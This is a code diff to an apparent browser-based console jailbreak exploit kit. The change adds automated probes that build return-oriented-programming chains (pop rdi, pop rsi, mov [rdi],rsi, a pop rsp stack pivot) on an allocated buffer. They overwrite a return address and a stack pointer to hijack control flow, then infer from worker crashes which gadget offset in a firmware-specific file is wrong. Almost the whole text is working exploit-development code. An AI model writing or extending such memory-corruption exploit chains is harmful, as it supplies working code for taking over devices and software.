@@ -233,7 +233,10 @@ async function prepare(p) {
            first sent a run that had already reached probe=sj back to
            probe=pivot. Rank the stages and advance from the highest seen. */
         const stageOf = (x) =>
-            x.indexOf("probe-sj") === 0 ? 4
+            x.indexOf("probe-g2") === 0 ? 7
+            : x.indexOf("probe-g1") === 0 ? 6
+            : x.indexOf("probe-p") === 0 ? 5
+            : x.indexOf("probe-sj") === 0 ? 4
             : x.indexOf("probe-w") === 0 ? 3
             : x.indexOf("probe-rsp") === 0 ? 2
             : x.indexOf("probe-pivot") === 0 ? 1 : 0;
@@ -246,12 +249,46 @@ async function prepare(p) {
 
         const wFinished = parts.some(x => x.indexOf("probe-w-SILENT") === 0
             || x.indexOf("probe-w-ANSWERED") === 0);
-        if (!PROBE && maxStage === 3 && !wFinished && (attempts["w"] || 0) >= 2) {
-            jbmark("PROBE-VERDICT", "probe=w has now CRASHED twice without"
-                + " reporting. It runs only pop rdi / pop rsi / mov [rdi],rsi"
-                + " then infloop, and probe=rsp proved the pivot and stack"
-                + " switch, so one of those three gadget addresses in offsets/"
-                + window.fw_str + ".js is wrong. Re-derive them.");
+        const fin = (pfx) => parts.some(x => x.indexOf(pfx + "-SILENT") === 0
+            || x.indexOf(pfx + "-ANSWERED") === 0);
+        const crashedTwice = (k, pfx) => (attempts[k] || 0) >= 2 && !fin(pfx);
+
+        // --- sub-bisect of the three write gadgets --------------------------
+        if (!PROBE && maxStage === 7) {
+            jbmark("PROBE-VERDICT", fin("probe-g2")
+                ? "pop rdi, pop rsi and infloop are ALL individually correct, so"
+                + " `mov [rdi], rsi` (0x" + wk_gadgetmap["mov [rdi], rsi"].toString(16)
+                + ") is the broken gadget in offsets/" + window.fw_str + ".js."
+                : "pop rsi (0x" + wk_gadgetmap["pop rsi"].toString(16) + ") is the"
+                + " broken gadget: alone with infloop after it, it still crashes.");
+        } else if (!PROBE && maxStage === 6 && crashedTwice("g1", "probe-g1")) {
+            jbmark("PROBE-VERDICT", "pop rdi (0x" + wk_gadgetmap["pop rdi"].toString(16)
+                + ") is the broken gadget: alone with infloop after it, it still"
+                + " crashes -- it is not `5F C3`, most likely it pops more than"
+                + " one register and desyncs the chain.");
+        } else if (!PROBE && maxStage === 6 && fin("probe-g1")) {
+            PROBE = "g2";
+            jbmark("PROBE-AUTO", "pop rdi is fine on its own -- testing pop rsi alone");
+        } else if (!PROBE && maxStage === 6) {
+            PROBE = "g1";
+            jbmark("PROBE-AUTO", "repeating probe=g1");
+        } else if (!PROBE && maxStage === 5 && fin("probe-p")) {
+            jbmark("PROBE-VERDICT", "both pops are correct (probe=p parked cleanly),"
+                + " so `mov [rdi], rsi` (0x"
+                + wk_gadgetmap["mov [rdi], rsi"].toString(16) + ") is the broken"
+                + " gadget in offsets/" + window.fw_str + ".js. Re-derive it.");
+        } else if (!PROBE && maxStage === 5 && crashedTwice("p", "probe-p")) {
+            PROBE = "g1";
+            jbmark("PROBE-AUTO", "both pops together crash -- testing pop rdi alone");
+        } else if (!PROBE && maxStage === 5) {
+            PROBE = "p";
+            jbmark("PROBE-AUTO", "repeating probe=p");
+        } else if (!PROBE && maxStage === 3 && !wFinished && (attempts["w"] || 0) >= 2) {
+            PROBE = "p";
+            jbmark("PROBE-AUTO", "probe=w crashed twice, so one of pop rdi / pop rsi"
+                + " / mov [rdi],rsi is wrong -- sub-bisecting: probe=p runs the two"
+                + " pops with infloop straight after, which also catches a gadget"
+                + " that pops more registers than the profile claims");
         } else if (!PROBE && maxStage === 4 && !sjFinished
             && (attempts["sj"] || 0) >= 2 && wFinished) {
             jbmark("PROBE-VERDICT", "probe=sj has CRASHED twice while probe=w"
@@ -833,6 +870,48 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        if (PROBE === "p" || PROBE === "g1" || PROBE === "g2") {
+            /* Sub-bisect of the three write gadgets. Nothing can be read back
+               (a wrong gadget crashes rather than writing), so each run is a
+               pure crash/silent answer -- but each also tests ARITY, which is
+               the likeliest fault: a `pop rdi ; pop rbp ; ret` consumes two
+               stack slots instead of one, swallows the next chain entry and
+               returns into whatever follows. Putting infloop immediately after
+               the popped value detects exactly that: one slot => we park,
+               two slots => infloop is eaten and control lands on garbage.
+
+                 p  : pop rdi, V, pop rsi, V, infloop   (both pops, no store)
+                 g1 : pop rdi, V, infloop               (pop rdi alone)
+                 g2 : pop rsi, V, infloop               (pop rsi alone)          */
+            const stk = malloc(0x200);
+            const V = new int64(0x41414141, 0x00004141);
+            let i = 0;
+            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
+            if (PROBE === "p" || PROBE === "g1") { put(gadgets["pop rdi"]); put(V); }
+            if (PROBE === "p" || PROBE === "g2") { put(gadgets["pop rsi"]); put(V); }
+            put(gadgets["infloop"]);
+
+            crumb("probe-" + PROBE + "-w1");
+            p.write8(return_address_ptr, gadgets["pop rsp"]);
+            p.write8(stack_pointer_ptr, stk);
+            crumb("probe-" + PROBE + "-armed");
+            jbmark("PROBE-WAIT", "probe=" + PROBE + " armed -- a few seconds, do NOT reload");
+            const ans = await new Promise((resolve) => {
+                const t = setTimeout(() => resolve(false), 4000);
+                worker.onmessage = function () { clearTimeout(t); resolve(true); };
+                crumb("probe-" + PROBE + "-pm");
+                worker.postMessage(0);
+            });
+            crumb("probe-" + PROBE + "-" + (ans ? "ANSWERED" : "SILENT"));
+            const names = { p: "pop rdi AND pop rsi", g1: "pop rdi", g2: "pop rsi" };
+            throw new Error("probe=" + PROBE + ": worker "
+                + (ans ? "ANSWERED" : "went SILENT without crashing")
+                + " -- " + names[PROBE] + " "
+                + (ans ? "did not take the pivot" : "consume exactly one stack"
+                    + " slot each and return correctly")
+                + ". Worker is spinning; reload.");
+        }
+
         if (PROBE === "w") {
             /* probe=sj crashed, and it is probe=rsp (which works) plus two
                things: the write gadgets and setjmp. Run ONLY the writes and
@@ -1125,4 +1204,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=29`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=30`);
